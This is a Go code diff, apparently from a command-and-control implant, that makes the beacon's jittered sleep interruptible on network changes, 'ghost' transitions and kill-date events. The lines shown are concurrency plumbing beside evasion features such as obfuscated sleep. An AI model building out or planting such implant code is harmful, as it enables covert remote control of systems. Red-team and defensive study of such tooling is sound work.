@@ -17,6 +17,20 @@ func requestBeaconWake() {
 	}
 }
 
+// wakeBeaconLoop interrupts either sleep path the main loop can be in: the
+// interruptible helper (backoff/ghost slices) listens on beaconWakeCh, while
+// the regular sleep listens on beaconWake. Used by the network-change monitor.
+func wakeBeaconLoop() {
+	select {
+	case beaconWake <- struct{}{}:
+	default:
+	}
+	select {
+	case beaconWakeCh <- struct{}{}:
+	default:
+	}
+}
+
 // sleepInterruptible sleeps up to d, returning early on a wake request.
 func sleepInterruptible(d time.Duration) {
 	if d <= 0 {
@@ -41,7 +55,7 @@ func sleepWithJitter() {
 			sleepObfuscated(duration)
 			return
 		}
-		time.Sleep(duration)
+		waitForBeaconWake(duration)
 		return
 	}
 
@@ -60,7 +74,10 @@ func sleepWithJitter() {
 			sleepObfuscated(duration)
 			return
 		}
-		time.Sleep(duration)
+		// Interruptible so a network change (agent_netwake.go), ghost
+		// transition or kill-date wake is observed promptly even when the JIT
+		// scheduler owns the cadence.
+		waitForBeaconWake(duration)
 		return
 	}
 
